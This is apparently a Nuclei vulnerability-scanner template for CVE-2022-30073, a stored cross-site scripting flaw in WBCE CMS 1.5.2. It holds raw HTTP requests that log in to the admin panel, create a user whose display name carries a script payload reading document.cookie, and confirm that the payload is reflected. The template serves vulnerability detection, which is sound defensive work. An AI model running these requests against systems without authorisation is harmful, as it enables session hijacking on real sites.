http:
- extractors:
  - group: 1
    internal: true
    name: formtoken
    part: body
    regex:
    - <input\stype="hidden"\sname="formtoken"\svalue="([^"]*)"\s/>
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <p><b><script>alert(document.cookie)</script>
    - WBCECMS
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /admin/login/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    url=&username_fieldname=username_axh5kevh&password_fieldname=password_axh5kevh&username_axh5kevh={{username}}&password_axh5kevh={{password}}&submit=Login

    '
  - 'GET /admin/users/index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /admin/users/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    formtoken={{formtoken}}&user_id=&username_fieldname=username_tep83j9z&username_tep83j9z=testme2&password=temp1234&password2=temp1234&display_name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&email=testme2%40abc.com&home_folder=&groups%5B%5D=1&active%5B%5D=1&submit=

    '
  - 'GET /admin/users/index.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-30073
info:
  author: arafatansari
  classification:
    cpe: cpe:2.3:a:wbce:wbce_cms:1.5.2:*:*:*:*:*:*:*
    cve-id: CVE-2022-30073
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.94042
    epss-score: 0.13759
  description: 'WBCE CMS 1.5.2 contains a stored cross-site scripting vulnerability
    via \admin\user\save.php Display Name parameters.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 4
    product: wbce_cms
    vendor: wbce
    verified: true
  name: WBCE CMS 1.5.2 - Cross-Site Scripting
  reference:
  - https://github.com/APTX-4879/CVE
  - https://github.com/APTX-4879/CVE/blob/main/CVE-2022-30073.pdf
  - https://nvd.nist.gov/vuln/detail/CVE-2022-30073
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade to a patched version of WBCE CMS or apply the vendor-supplied
    patch to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2022,cve,wbcecms,xss,wbce,vuln
